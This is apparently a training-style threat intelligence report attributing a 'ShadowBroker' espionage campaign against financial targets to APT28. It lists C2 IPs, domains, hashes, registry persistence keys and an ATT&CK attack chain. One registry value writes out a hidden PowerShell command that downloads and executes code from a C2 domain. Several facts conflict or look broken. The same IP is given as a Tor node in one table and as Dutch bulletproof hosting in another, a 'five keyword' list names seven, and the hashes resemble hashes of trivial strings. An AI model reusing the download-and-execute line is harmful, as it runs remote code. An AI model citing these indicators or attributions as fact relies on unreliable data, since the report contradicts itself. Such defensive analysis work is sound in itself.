# Threat Intelligence Report
## Operation ShadowBroker — APT Attribution Analysis

---

> **Classification:** TLP:AMBER — For Authorised Recipients Only
> **Report Type:** Threat Actor Profile & Attribution Assessment
> **Analyst:** Cyber Threat Intelligence Analyst — Security Operations Center
> **Report Date:** 25 September 2026
> **Confidence Level:** Medium
> **Attributed Actor:** APT28 (Russia / GRU) — Medium Confidence

---

## Executive Summary

The **ShadowBroker** campaign represents a state-sponsored cyber espionage operation attributed with **Medium Confidence** to **APT28 (Russia/GRU)**, originating from the UTC+3 time zone consistent with Eastern European and Russian operational hours.

Over a **six-month operational window (January–June 2023)**, the adversary conducted six consecutive campaigns against global financial infrastructure and software supply-chain vendors across North America, Europe, and Asia-Pacific — with the strategic objective of gathering long-term economic intelligence rather than rapid monetisation.

The threat actor demonstrated exceptional capability: **Technical Sophistication rated 9/10** and **Operational Sophistication rated 8/10**. The campaign used custom malware binaries, XOR encryption, and process injection to exfiltrate between **0.8 GB and 8.1 GB of data per campaign**, while maintaining continuous post-exfiltration persistence through scheduled tasks and DLL hijacking.

**Three immediate defensive priorities for security leadership:**

1. **Deploy behavioural EDR** — shift from signature-based blocking to hunting for process injection, scheduled task autostarts, and DLL hijacking behaviours that this actor's toolset relies on.
2. **Audit supply chain access** — the actor's pivot to a software vendor (Campaign 6) was a deliberate supply chain intrusion designed to reach hardened downstream financial clients.
3. **Monitor scheduled tasks and Run key autostarts** — all four of the actor's confirmed persistence mechanisms touch these vectors and represent the most actionable detection opportunity.

---

## Analyst Methodology

This report was produced through structured threat intelligence analysis of the ShadowBroker campaign dataset. The analysis covered five intelligence disciplines:

| Discipline | Method Applied |
|---|---|
| **Technical Intelligence** | IOC categorisation — IP addresses, domains, file hashes, registry keys |
| **Infrastructure Analysis** | Pattern recognition across C2 hosting providers, ASNs, and IP clustering |
| **Operational Intelligence** | Victimology mapping, campaign timing analysis, TTP assessment |
| **Threat Actor Profiling** | Motivation, capability, and geographic origin assessment |
| **Attribution Analysis** | Structured hypothesis testing with alternative actor evaluation |

All assessments follow the **Structured Analytic Techniques (SAT)** framework. Confidence levels are assigned using the **NATO Admiralty Code** for source reliability and information credibility.

---

## Part 1 — Technical Intelligence Analysis

### 1.1 — Command and Control IP Address Infrastructure

**Four C2 servers** were identified across the ShadowBroker campaign. Rather than centralising infrastructure, the actor deliberately distributed hosting across multiple countries and providers to eliminate single points of takedown and complicate attribution.

| IP Address | ASN | Hosting Provider | Country | Status | First Seen | Last Seen |
|---|---|---|---|---|---|---|
| `203.0.113.45` | AS12345 | CloudServe Inc | Netherlands | 🟢 Active | 2023-01-15 | 2023-06-15 |
| `198.51.100.78` | AS54321 | EuroHost | Romania | 🔴 Dormant | 2023-02-01 | 2023-04-20 |
| `192.0.2.156` | AS99999 | NetServe Solutions | Bulgaria | 🟢 Active | 2023-03-10 | 2023-06-10 |
| `185.220.101.45` | AS205206 | Tor Project | Unknown | 🔴 Dormant | 2023-04-15 | 2023-05-20 |

---

![C2 IP address table extracted from threat intelligence platform showing four servers across Netherlands, Romania, Bulgaria, and Tor exit nodes with ASN details, hosting providers, and active/dormant status](images/part1_c2_ip_table.png)

*Figure 1 — ShadowBroker C2 IP infrastructure across four countries. The geographic distribution across Western and Eastern Europe, combined with Tor anonymisation, is a deliberate operational security measure to prevent single-point takedown and complicate geographic attribution.*

---

**Intelligence Assessment — IP Infrastructure:**

Three analytical findings emerge from the IP data:

**Geographic clustering, not geographic origin.** All four C2 servers are hosted in Europe, but this does not indicate the threat actor is European. Sophisticated adversaries routinely rent infrastructure from European commercial providers specifically to blend malicious traffic with legitimate regional network flows. The Netherlands is a particularly common choice due to its high-bandwidth internet exchange points and permissive hosting environment.

**Provider diversification as resilience strategy.** No single commercial provider hosts more than one C2 server. By distributing across CloudServe Inc (Netherlands), EuroHost (Romania), and NetServe Solutions (Bulgaria), the actor ensures that a takedown notice to any single provider only removes 25% of their infrastructure. The Tor exit node adds a layer of anonymisation that survives all provider-level actions.

**Active vs. dormant lifecycle management.** The Romanian and Tor-based servers transitioned to dormant status while the Netherlands and Bulgaria servers remained active through the campaign's end. This lifecycle management suggests the actor rotates infrastructure between campaigns rather than abandoning it — a resource-efficient operational model consistent with a funded, organised group.

---

### 1.2 — Malicious Domain Intelligence

**Seven domains** were registered and operated by ShadowBroker across the six-month campaign. All used IT-themed naming conventions designed to impersonate legitimate enterprise software update and verification traffic.

| Domain | Registrar | Registration Date | Nameservers | A Record | Status |
|---|---|---|---|---|---|
| `secureupdate.com` | NameCheap | 2023-01-15 | ns1/ns2.cloudserve.net | `203.0.113.45` | 🟢 Active |
| `verifysession.net` | GoDaddy | 2023-01-20 | ns1/ns2.godaddy.com | `203.0.113.45` | 🟢 Active |
| `systemcheck.org` | NameCheap | 2023-02-01 | ns1/ns2.cloudserve.net | `198.51.100.78` | 🔴 Dormant |
| `backupverify.net` | NameCheap | 2023-02-05 | ns1/ns2.cloudserve.net | `198.51.100.78` | 🔴 Dormant |
| `updatecheck.com` | GoDaddy | 2023-03-10 | ns1/ns2.godaddy.com | `192.0.2.156` | 🟢 Active |
| `systemupdate.org` | NameCheap | 2023-03-15 | ns1/ns2.cloudserve.net | `192.0.2.156` | 🟢 Active |
| `checkversion.net` | GoDaddy | 2023-03-20 | ns1/ns2.godaddy.com | `192.0.2.156` | 🟢 Active |

---

![Malicious domain registration table showing seven ShadowBroker domains with registrars NameCheap and GoDaddy, registration dates in precise 5-day intervals, shared nameservers, A record IP mappings, and active/dormant status](images/part1_domain_table.png)

*Figure 2 — ShadowBroker domain registration data. Three intelligence signals are visible: the programmatic 5-day registration intervals suggesting automated rollout, the nameserver clustering across NameCheap-hosted domains pointing to the same C2 IP addresses, and the IT-themed naming pattern designed to impersonate legitimate enterprise update traffic.*

---

**Intelligence Assessment — Domain Infrastructure:**

**Programmatic registration pattern.** Domain registrations are consistently spaced in **5-day intervals** within each month (Jan-15, Jan-20; Feb-01, Feb-05; Mar-10, Mar-15, Mar-20). This regularity is too precise to be coincidental — it indicates either automated scripted domain provisioning or a structured operational planning cycle. Either interpretation points to an organised, resource-structured operation.

**Infrastructure reuse through shared nameservers.** Multiple domains resolve to the same C2 IP addresses via the same nameservers. For example, `secureupdate.com` and `systemcheck.org` both point to `ns1/ns2.cloudserve.net` and share the same underlying C2 IP. This is a cost-efficiency trade-off: the actor maintains fewer IP addresses but multiplexes multiple domain names against each — making domain-level blocking insufficient as a defence.

**Naming strategy — IT-theme impersonation.** Every domain name contains one or more of five IT-administrative keywords: "update," "check," "verify," "secure," "system," "backup," "version." The intent is to make C2 beacon traffic resemble legitimate Windows Update, antivirus update, or enterprise software check-in traffic. DNS and proxy logs showing repeated queries to `systemupdate.org` or `secureupdate.com` would, in many environments, be dismissed as normal operational noise — precisely the outcome the actor designs for.

---

### 1.3 — Malware File Hash Analysis

**Four Windows PE32 executables** were identified as ShadowBroker campaign tools. Hash analysis, compilation timestamps, and PDB path artifacts provide intelligence beyond simple file identification.

| File Type | MD5 (Truncated) | SHA256 (Truncated) | File Size | Compiled (UTC) | First Seen |
|---|---|---|---|---|---|
| Windows PE32 | `5d41402a...` | `2c26b469...` | 245,760 bytes | 2023-01-10 14:32:45 | 2023-01-15 |
| Windows PE32 | `7b52009b...` | `e3b0c442...` | 512,000 bytes | 2023-01-08 09:15:30 | 2023-01-15 |
| Windows PE32 | `3c59dc04...` | `6b86b273...` | 128,512 bytes | 2023-01-12 11:22:15 | 2023-02-01 |
| Windows PE32 | `1b1a9b5a...` | `d4735fea...` | 256,000 bytes | 2023-03-05 16:45:20 | 2023-03-10 |

**PDB Path Artifact (Critical Attribution Evidence):**

```
C:\Users\dev\Projects\shadowbroker\Release\payload.pdb
```

---

![File hash table showing four ShadowBroker PE32 executables with MD5, SHA256, file sizes between 128-512 KB, UTC compilation timestamps aligned with European business hours, and a highlighted PDB path artifact revealing internal project naming](images/part1_file_hashes.png)

*Figure 3 — ShadowBroker malware file hashes and compilation metadata. Key attribution signals: (1) compilation timestamps convert to standard business hours in UTC+2/UTC+3, consistent with an Eastern European salaried developer; (2) the PDB path exposes internal project naming conventions and workspace structure — an operational security oversight by the malware author.*

---

**Intelligence Assessment — Malware Metadata:**

**Compilation timestamps as timezone attribution evidence.** All four compilation timestamps fall between **09:15 and 16:45 UTC**. When adjusted to UTC+2 (Eastern European Time) or UTC+3 (Moscow Time), these timestamps map to **12:15–19:45 local time** — standard afternoon business hours for a salaried developer. This is not consistent with opportunistic criminal activity, which typically shows irregular, evening, or weekend timestamps. It is consistent with a professional, government-employed software development team operating on a structured working schedule.

**Staging delay as evidence of planned operations.** In every case, the binary compilation precedes the first observed deployment by 5–7 days. This deliberate gap indicates a development-testing-staging-deployment pipeline — not ad hoc malware usage. Planned campaigns, not reactive operations.

**PDB path — the analyst's highest-value artifact.** The debug symbol file path `C:\Users\dev\Projects\shadowbroker\Release\payload.pdb` is a critical operational security failure. It reveals:
- The project is named **"shadowbroker"** internally — the same designation used in this analysis
- The developer's Windows username is **"dev"** — suggesting a dedicated build machine, not a personal workstation
- The binary was compiled from a `Release` build configuration — indicating a mature software development workflow with separate debug and release environments

**Binary size profile — modular architecture.** The four binaries range from 128 KB to 512 KB — small, focused executables rather than monolithic toolkits. This size profile is consistent with **modular malware architecture**, where each binary performs a specific function (reconnaissance, persistence, exfiltration) rather than a single all-in-one tool. Modular architecture reduces detection risk — deploying a 128 KB process injector is less conspicuous than a 4 MB malware suite.

---

### 1.4 — Registry Persistence Indicators

**Four registry-based persistence mechanisms** were documented across the ShadowBroker campaign, covering escalating privilege levels from user-context to kernel-level persistence.

| Registry Key | Value Data | Purpose | Privilege Level | First Observed |
|---|---|---|---|---|
| `HKLM\Software\Microsoft\Windows\Run\SystemCheck` | `C:\Windows\System32\svchost.exe -k SystemCheck` | Autostart persistence | **System (HKLM)** | 2023-01-15 |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateService` | `C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Update\update.exe` | User-level persistence | **User (HKCU)** | 2023-01-20 |
| `HKLM\System\CurrentControlSet\Services\ShadowCheck` | `C:\Windows\System32\drivers\shadowcheck.sys` | Kernel-level persistence | **Kernel / Driver** | 2023-02-01 |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Run\VersionCheck` | `powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://secureupdate.com/check')"` | Fileless PowerShell persistence | **User (Fileless)** | 2023-03-10 |

---

![Registry persistence indicators table showing four ShadowBroker autostart mechanisms across HKLM system keys, HKCU user keys, kernel driver service, and fileless PowerShell IEX execution — with privilege levels and first observed dates](images/part1_registry_persistence.png)

*Figure 4 — ShadowBroker registry persistence mechanisms. The escalating progression from user-level Run keys (January) through kernel driver services (February) to fileless PowerShell execution (March) demonstrates a deliberate defense evasion strategy — each new mechanism is harder to detect and remove than the previous.*

---

**Intelligence Assessment — Persistence Strategy:**

The four persistence mechanisms are not redundant copies of the same technique — they form a **deliberate, escalating defense evasion strategy** deployed in sequence:

**Stage 1 (January) — Standard Run keys in HKLM and HKCU.** The most common persistence vectors, immediately visible to threat hunters and EDR tools scanning autostarts. These serve as the primary persistence layer and as a distraction from more deeply embedded mechanisms.

**Stage 2 (February) — Kernel driver service via HKLM\System\CurrentControlSet\Services.** Registering a kernel driver (`shadowcheck.sys`) as a Windows service elevates the persistence to ring-0 privilege. A malicious kernel driver survives EDR removal attempts, endpoint reimaging warnings, and user-mode security tools — because it operates below them. This is a significant technical capability indicator.

**Stage 3 (March) — Fileless PowerShell execution via IEX download.** The fourth mechanism executes entirely in memory — `IEX(New-Object Net.WebClient).DownloadString(...)` downloads and executes a PowerShell payload from the C2 server without writing anything to disk. Standard antivirus and file-based detection tools generate zero alerts. The payload lives only in PowerShell's memory space for the duration of the session.

The timeline of these mechanisms maps directly to campaign progression — as the actor achieved deeper network access, they installed progressively harder-to-remove persistence to protect their operational foothold.

---

## Part 2 — Infrastructure Pattern Recognition

### 2.1 — Domain-to-IP Clustering

The actor multiplexes multiple domain names against single C2 IP addresses across three `/24` subnet blocks. This domain-multiplexing strategy means that blocking any individual domain leaves the underlying C2 IP — and all other domains pointing to it — fully operational.

| IP Address | Hosted Domains | Subnet |
|---|---|---|
| `185.220.101.45` | `command.shadowbroker.net`, `shadowbroker.net` | 185.220.101.0/24 |
| `185.220.102.8` | `control.shadowbroker.net`, `shadowbroker.net` | 185.220.102.0/24 |
| `185.220.103.25` | `beacon.shadowbroker.net`, `shadowbroker.net` | 185.220.103.0/24 |

---

### 2.2 — Infrastructure Cluster Analysis

Three geographically distinct infrastructure clusters were identified:

| Cluster | Geographic Region | Hosting Provider | ASN | Core IPs | Associated Domains | Share |
|---|---|---|---|---|---|---|
| **Cluster A** | Netherlands | Bulletproof Hosting | AS206289 | 185.220.101.45, 185.220.102.8, 185.220.103.25 | shadowbroker.net, shadowbroker-update.com | 50% |
| **Cluster B** | Romania | Hosting Freedom | AS206290 | 188.40.75.50, 188.40.76.100 | shadowbroker.io, shadowbroker-secure.net | 30% |
| **Cluster C** | Russia | FastHost Services | AS206291 | 194.67.45.30 | shadowbroker-backup.com | 20% |

---

![Infrastructure cluster diagram showing three geographic clusters — Netherlands (50% share, bulletproof hosting), Romania (30%), and Russia (20%) — with associated IP addresses and domain mappings across each cluster](images/part2_infrastructure_clusters.png)

*Figure 5 — ShadowBroker infrastructure cluster map. The three-cluster architecture distributes operational load and provides geographic redundancy — a Netherlands cluster takedown only removes 50% of C2 capacity. The 20% Russian cluster, while smaller, is the most significant attribution signal in the infrastructure data.*

---

**Intelligence Assessment — Infrastructure Architecture:**

**Bulletproof hosting as the operational backbone.** Cluster A, hosted in the Netherlands on a provider classified as bulletproof hosting (AS206289), forms the operational core at 50% capacity. Bulletproof hosting providers have a known policy of non-compliance with law enforcement takedown requests and abuse complaints — making them the preferred infrastructure choice for sophisticated, long-duration operations that require stable C2 uptime.

**Russian infrastructure as the attribution anchor.** Cluster C (20% share, `194.67.45.30`, FastHost Services, AS206291) represents the most direct geographic attribution signal. While the actor uses European infrastructure to blend into legitimate traffic for most operations, maintaining a Russian-hosted cluster — even a minor one — suggests comfort operating on domestic infrastructure, or a cost/convenience trade-off that accepted the attribution risk for a smaller operational component.

**Multi-tiered architecture indicates high operational maturity.** The three-cluster design with geographic separation and automated failover demonstrates infrastructure engineering beyond the capability of most financially motivated criminal groups. This level of infrastructure investment — multiple hosting providers, multiple countries, domain multiplexing — is consistent with nation-state or state-sponsored operational funding.

---

## Part 3 — MITRE ATT&CK Mapping

### 3.1 — Tactic Frequency Distribution

| Tactic | Frequency | Percentage | Primary Techniques Observed |
|---|---|---|---|
| **Persistence** | 3 | 16.67% | T1547.001 (Registry Run Keys), T1053.005 (Scheduled Tasks), T1574.001 (DLL Hijacking) |
| **Initial Access** | 2 | 11.11% | T1566.001 (Spearphishing Attachment), T1195.002 (Supply Chain Compromise) |
| **Execution** | 2 | 11.11% | T1059.001 (PowerShell), T1059.003 (Windows Command Shell) |
| **Defense Evasion** | 2 | 11.11% | T1055 (Process Injection), T1027 (Obfuscated Files) |
| **Credential Access** | 2 | 11.11% | T1003.001 (LSASS Memory Dumping / Mimikatz) |
| **Exfiltration** | 2 | 11.11% | T1041 (Exfiltration Over C2), T1560.001 (Archive via Utility) |
| **Discovery** | 2 | 11.11% | T1016 (System Network Configuration), T1049 (System Network Connections) |
| **Lateral Movement** | 2 | 11.11% | T1550.002 (Pass the Hash), T1021.001 (Remote Desktop Protocol) |
| **Command & Control** | 1 | 5.56% | T1071.001 (Application Layer Protocol: Web) |

---

![MITRE ATT&CK tactic frequency bar chart showing Persistence at 16.67% as the highest frequency tactic followed by eight other tactics at 11.11% each and Command and Control at 5.56%](images/part3_mitre_frequency.png)

*Figure 6 — ShadowBroker MITRE ATT&CK tactic frequency distribution. Persistence dominates at 16.67%, consistent with the actor's primary objective of maintaining long-term undetected access for ongoing intelligence collection. The balanced distribution across all other tactics reflects a mature, full-spectrum operation covering every phase of the intrusion lifecycle.*

---

### 3.2 — Full Attack Chain Sequence

The ShadowBroker campaign follows a structured four-phase attack chain:

```
PHASE 1 — BREACH & EVASION
────────────────────────────────────────────────────────
T1566.001  Spearphishing Attachment
    │       Custom phishing framework delivers malicious payload via email
    ▼
T1059.001  PowerShell Execution
    │       Native PowerShell used to execute initial payload (LOLBin — evades allowlists)
    ▼
T1055      Process Injection
    │       Payload injected into legitimate Windows process memory
    ▼
T1027      Defense Evasion — Obfuscation
            XOR-encrypted binaries bypass signature-based endpoint detection

PHASE 2 — EXPANSION
────────────────────────────────────────────────────────
T1003.001  LSASS Memory Dump (Mimikatz variant)
    │       Credentials extracted directly from Windows memory — no disk artifacts
    ▼
T1016      Network Discovery
    │       Internal network topology mapped for lateral movement targeting
    ▼
T1550.002  Pass the Hash
    │       Stolen NTLM hashes authenticate to remote systems — no plaintext needed
    ▼
T1021.001  Remote Desktop Protocol
            Authenticated RDP sessions to compromised internal hosts

PHASE 3 — ACTION ON OBJECTIVES
────────────────────────────────────────────────────────
T1560.001  Archive Collected Data (7-Zip)
    │       Target data compressed 0.8–8.1 GB per campaign
    ▼
T1041      Exfiltration Over Custom C2 Channel
            Compressed archive transferred via encrypted C2 protocol

PHASE 4 — MAINTENANCE (Post-Exfiltration)
────────────────────────────────────────────────────────
T1053.005  Scheduled Tasks
    │       Auto-executing tasks re-establish access after discovery events
    ▼
T1574.001  DLL Hijacking
            Malicious DLL planted in legitimate application path — loads on application start
            Provides persistent access that survives endpoint reimaging at application level
```

---

**Attack Chain Intelligence Assessment:**

**The most important observation is Phase 4.** Most threat actors exit after successful data exfiltration. ShadowBroker does the opposite — after exfiltrating data in Campaign 4, they immediately re-establish system-level persistence in Campaigns 5 and 6. This proves the objective is **not** a single intelligence collection event. The actor intends to maintain continuous access to the target environment for ongoing, long-term intelligence mining. This is the defining characteristic that separates a state-sponsored espionage mandate from a financially motivated criminal operation.

**Living off the Land (LotL) strategy.** Phase 2 relies almost entirely on tools already present on every Windows system — PowerShell, RDP, NTLM authentication. Using native utilities instead of custom malware dramatically reduces the detection surface. EDR tools that alert on custom malware signatures generate zero alerts when the attacker moves laterally via RDP with valid stolen credentials.

**Hybrid toolset design.** The campaign combines LotL techniques (Phase 2) with custom-engineered malware (Phase 1 and Phase 3). This hybrid approach reflects deliberate operational design: use native tools where stealth matters, use custom tools where capability matters. It requires both offensive tradecraft knowledge and software engineering capability — a combination available only to well-resourced, sophisticated actors.

---

## Part 4 — Operational Intelligence Analysis

### 4.1 — Victimology Profile

| Industry | Geographic Region | Campaigns | Success Rate | Data Volume |
|---|---|---|---|---|
| Banking Infrastructure | Europe | 2 | 58% | High |
| Financial Services | North America | 2 | 45% | High |
| Cryptocurrency Exchange | Asia-Pacific | 1 | 45% | Medium |
| Payment Processors | Europe | 1 | 52% | Medium |
| Software Vendor (Supply Chain) | Multiple | 1 | 15% | Low |

**Geographic distribution:**
- North America: 2 campaigns — 33.3%
- Europe: 2 campaigns — 33.3%
- Asia-Pacific: 1 campaign — 16.7%
- Multiple / Supply Chain: 1 campaign — 16.7%

---

![Victimology table and geographic distribution chart showing ShadowBroker targeting concentration in financial services sector across North America and Europe with a supply chain compromise targeting a software vendor to reach downstream financial clients](images/part4_victimology.png)

*Figure 7 — ShadowBroker victimology analysis. The sector concentration — exclusively financial services, cryptocurrency, payment processing, and banking infrastructure — confirms strategic, not opportunistic targeting. The software vendor deviation was not a random target; it was a supply chain pivot designed to bypass hardened defences at primary financial targets.*

---

**Intelligence Assessment — Target Selection:**

**Strategic, not opportunistic targeting.** Every primary target is a high-value financial entity. This is not random network scanning — it represents deliberate target selection based on the economic intelligence value of each organisation. Financial institutions hold data that is directly useful for economic intelligence: transaction flows, capital positions, market positioning, and monetary policy intelligence.

**The supply chain deviation is itself an intelligence signal.** The software vendor compromise (Campaign 6, 15% success rate) was the actor's lowest-performing campaign by success metrics. Yet they executed it anyway. This tells us the actor was willing to accept a degraded success rate for the strategic value of gaining access to a trusted vendor's update pipeline — through which they could reach multiple hardened downstream financial clients simultaneously. Accepting a trade-off for strategic gain is a hallmark of nation-state operational planning.

**Absence of monetisation is the critical motivation indicator.** Across six months and up to 8.1 GB of exfiltrated data per campaign, there were zero ransom demands, zero darkweb data sales, and zero rapid monetisation attempts. Financially motivated actors monetise within hours to days of data theft. The complete absence of any monetisation activity — despite possessing data of significant financial value — is the strongest single indicator of a state-sponsored intelligence mandate.

---

### 4.2 — Campaign Timing Analysis

| Campaign | Start Date | End Date | Duration | Data Volume |
|---|---|---|---|---|
| SB_2023_001 | 2023-01-15 | 2023-02-01 | 17 days | Baseline |
| SB_2023_002 | 2023-02-01 | 2023-03-10 | 37 days | Expanding |
| SB_2023_003 | 2023-03-10 | 2023-04-20 | 41 days | Peak |
| SB_2023_004 | 2023-04-05 | 2023-05-15 | 40 days | Peak (overlapping) |
| SB_2023_005 | 2023-05-12 | 2023-06-05 | 24 days | Contracting |
| SB_2023_006 | 2023-06-08 | 2023-06-15 | 7 days | Terminal |

---

![Campaign timeline chart showing six ShadowBroker campaigns from January to June 2023 with start dates, end dates, and duration in days — campaigns 3 and 4 overlapping in April-May demonstrating expanding operational capacity](images/part4_campaign_timeline.png)

*Figure 8 — ShadowBroker six-month campaign timeline. Near-zero downtime across all six months — each campaign launches as the previous one concludes. The overlap between Campaigns 3, 4, and 5 (March–June) demonstrates the actor's capacity to manage multiple simultaneous intrusions, consistent with a team-based operation rather than a solo actor.*

---

**Intelligence Assessment — Timing Patterns:**

**Near-zero operational downtime.** The actor launches a new campaign as each previous campaign concludes — maintaining continuous target engagement across six months with no visible rest periods. This sustained tempo is not achievable by a solo actor and is consistent with a team of operators sharing workload across active engagements.

**Operational time zone — the highest-confidence attribution evidence.** All malware compilation timestamps and C2 infrastructure log activity falls between **09:15 and 16:45 UTC**. Adjusted to UTC+3 (Moscow Standard Time), this maps to **12:15–19:45 MSK** — afternoon business hours. Adjusted to UTC+2 (Eastern European Time), it maps to **11:15–18:45** — core business hours. Both conversions are consistent with salaried, office-based professional activity. No timestamps fall on weekends or outside business hours.

**Campaign duration evolution reveals operational learning.** Campaign 1 ran 17 days — a short exploratory operation. Campaigns 2–4 expanded to 37–41 days as the actor refined their approach and deepened access. Campaigns 5–6 contracted sharply, suggesting either target depletion, increased defensive pressure, or a planned operational conclusion. The arc from short → long → short mirrors a structured intelligence collection cycle.

---

### 4.3 — Tool and Technique Assessment

**Hybrid Toolset Architecture:**

| Tool Category | Specific Tools | Purpose |
|---|---|---|
| **Native Windows Utilities (LotL)** | PowerShell, PsExec, RDP, 7-Zip | Lateral movement, execution, compression — evades application allowlists |
| **Public Offensive Tools** | Mimikatz variants | Credential harvesting from LSASS memory |
| **Custom Malware** | Custom phishing framework, XOR encryptor, process injector, keylogger, custom C2 protocol | Tailored capabilities that bypass signature detection |

**Operational Security (OpSec) Assessment:** High

The actor's OpSec posture is rated **High** based on five observable behaviours:
- Custom XOR encryption prevents static signature detection of C2 traffic
- Process injection into legitimate processes hides malware execution from process-listing tools
- LotL technique usage blends attacker activity with legitimate administrator behaviour
- Infrastructure diversification across multiple providers prevents single-point attribution
- Domain naming mimicking legitimate IT traffic evades manual log review

**Single confirmed OpSec failure:** The PDB debug path (`C:\Users\dev\Projects\shadowbroker\Release\payload.pdb`) was not stripped from compiled binaries — a development workflow oversight that exposed internal project naming and developer environment structure.

---

## Part 5 — Threat Actor Profiling

### 5.1 — Motivation Assessment

**Primary Motivation: State-Sponsored Cyber Espionage — High Confidence**

| Motivation Indicator | Present? | Evidence |
|---|---|---|
| Advanced custom malware (beyond criminal toolkit capability) | ✅ Yes | Custom XOR encryption, process injection, proprietary C2 protocol |
| Strategic financial sector targeting | ✅ Yes | Exclusive focus on banking, cryptocurrency, payment processors |
| Geopolitical operational timing (UTC+3 business hours) | ✅ Yes | All activity 09:15–16:45 UTC — Moscow afternoon hours |
| Long-term post-exfiltration persistence | ✅ Yes | Scheduled tasks and DLL hijacking deployed after Campaign 4 exfiltration |
| Rapid monetisation (ransom, darkweb sales) | ❌ No | Zero monetisation attempts across six months |
| Ideological motivation (manifestos, defacement, public claims) | ❌ No | No public communications, no activist posture |
| Ransomware deployment | ❌ No | No ransomware at any campaign stage |

The convergence of four positive state-sponsored indicators and the complete absence of any criminal or ideological motivation markers supports a **High Confidence** assessment that ShadowBroker represents a state-sponsored cyber espionage operation with a mandate for long-term economic intelligence collection.

---

### 5.2 — Capability Assessment

**Technical Sophistication: 9 / 10**

The adversary engineers custom malware binaries, maintains a proprietary C2 protocol, and implements complex process injection techniques that evade enterprise-grade endpoint detection. Their consistent ability to compromise secure financial networks and exfiltrate data at scale (0.8–8.1 GB per campaign) validates these capabilities beyond theoretical assessment.

**Operational Sophistication: 8 / 10**

The actor maintained undetected persistence across six consecutive months — a significant operational achievement against security-conscious financial sector targets. Their evolution from sequential to concurrent campaign management and their tactical pivot to supply chain compromise demonstrate both adaptive planning and resource scalability.

**Resource Level: Nation-State / State-Sponsored APT**

Sustaining the observed operational tempo requires:
- Dedicated software engineering team for custom malware development and maintenance
- Multi-region C2 hosting budget across bulletproof providers
- Intelligence analysis capability to identify and prioritise financial sector targets
- Operational planning capability to design and execute six consecutive campaigns

This resource profile exceeds the capacity of all but the most sophisticated criminal organisations, and is most consistent with a state-sponsored group operating under government direction and funding.

---

## Part 6 — Attribution Assessment

### 6.1 — Primary Attribution Hypothesis

**Selected Threat Actor: APT28 (Russia / GRU)**
**Attribution Confidence: Medium**

---

![APT28 profile summary showing the actor's known aliases (Fancy Bear, Sofacy, STRONTIUM), confirmed GRU affiliation, historical target sectors (government, military, political), and the three ShadowBroker evidence pillars supporting attribution](images/part6_apt28_profile.png)

*Figure 9 — APT28 profile and ShadowBroker attribution evidence alignment. The three converging evidence pillars — operational timing, state-sponsored tradecraft, and infrastructure hosting preferences — form the basis of the Medium Confidence attribution.*

---

**Three Evidence Pillars Supporting APT28 Attribution:**

**Pillar 1 — Operational Time Zone Alignment:**
All C2 infrastructure log activity and malware compilation timestamps fall within **09:15–16:45 UTC**, which converts precisely to **12:15–19:45 MSK (UTC+3)** — the Moscow time zone. This alignment with standard Russian government business hours is not a coincidence of a single data point. It is consistent across all four malware binaries and the full six months of campaign activity.

**Pillar 2 — State-Sponsored Tradecraft and Persistence Mandate:**
The actor's use of custom malware binaries, XOR encryption, and process injection reflects APT28's known technical development capability. Critically, the post-exfiltration persistence re-establishment in Campaigns 5 and 6 (scheduled tasks, DLL hijacking) mirrors APT28's known operational mandate: maintaining persistent, long-term access for ongoing intelligence collection rather than single-event data theft.

**Pillar 3 — Infrastructure Hosting Preferences:**
Command and Control servers are predominantly hosted in Western Europe — specifically the Netherlands. This hosting preference is a well-documented APT28 tradecraft pattern, used to blend malicious C2 traffic with legitimate European enterprise network flows and minimise geographic attribution risk to Russian infrastructure.

---

### 6.2 — Alternative Hypotheses (Evaluated and Ruled Out)

**Alternative 1: APT41 (China / PLA-Affiliated)**

APT41 was evaluated due to their known dual-use espionage and financial targeting capability. However, APT41 was ruled out for a single decisive reason: **operational time zone contradiction.** APT41 operates primarily within **UTC+8 (China Standard Time)**. Activity at 09:15–16:45 UTC would correspond to 17:15–00:45 CST — late evening to midnight in China. This directly contradicts the observed operational window, which aligns with Moscow afternoon hours, not Beijing working hours.

**Alternative 2: FIN7 (Financially Motivated Criminal Group)**

FIN7 was evaluated due to their strong focus on financial sector targeting — the same sector concentration as ShadowBroker. However, FIN7 was ruled out on motivation grounds: **complete absence of monetisation.** FIN7's entire operational model is built around rapid data monetisation — credit card data sales, ransomware deployment, and darkweb market activity. ShadowBroker exfiltrated up to 8.1 GB of financial data per campaign across six months and monetised none of it. FIN7's toolkit relies on standard criminal toolkits, not the custom nation-state binaries observed in ShadowBroker.

---

### 6.3 — Confidence Assessment

**Current Confidence Level: Medium**

| Confidence Driver | Assessment |
|---|---|
| Operational timing alignment (UTC+3 Moscow hours) | Strong positive evidence |
| State-sponsored tradecraft consistency | Strong positive evidence |
| Infrastructure hosting patterns (Netherlands-centric) | Moderate positive evidence |
| Zero monetisation across six months of financial data | Strong positive evidence |
| Direct malware code overlap with confirmed APT28 samples | ❌ Not confirmed |
| Victimology alignment (financial vs. APT28's traditional defense/government targets) | ⚠️ Deviation — reduces confidence |

**Why this is Medium and not High Confidence:**

Two gaps prevent elevation to High Confidence:

1. **No confirmed code reuse.** High Confidence APT attribution typically requires reverse-engineering evidence showing shared code, encryption keys, or C2 protocol implementations directly matching known APT28 malware families (X-Agent, Fancy Bear implant, etc.). This analysis is based on behavioral and operational indicators, not direct binary analysis confirming code overlap.

2. **Targeting deviation.** APT28's historical target profile is military intelligence, government agencies, NATO institutions, and electoral infrastructure. A six-month exclusive focus on financial networks and cryptocurrency exchanges represents a deviation from their documented mandate. Without an identified geopolitical trigger explaining why GRU would redirect resources toward financial intelligence collection, this gap weakens the attribution.

**How to elevate to High Confidence:**

Confidence would increase to **High** if any of the following were confirmed:
- Reverse engineering of the four identified binaries reveals shared encryption routines, code patterns, or C2 protocol implementations matching known APT28 malware
- A secondary ShadowBroker campaign is identified targeting NATO member government or defense contractors — aligning victimology with APT28's core mandate
- Signals intelligence or law enforcement confirmation of Russian GRU infrastructure involvement

---

## Intelligence Gaps and Analytical Limitations

| Gap | Impact on Assessment | How to Close |
|---|---|---|
| No binary-level APT28 code overlap confirmed | Confidence remains Medium rather than High | Full reverse engineering of the four identified PE32 binaries |
| Targeting deviation from APT28's traditional mandate | Creates alternative hypothesis space | Identify geopolitical trigger or secondary campaign targeting government/defense |
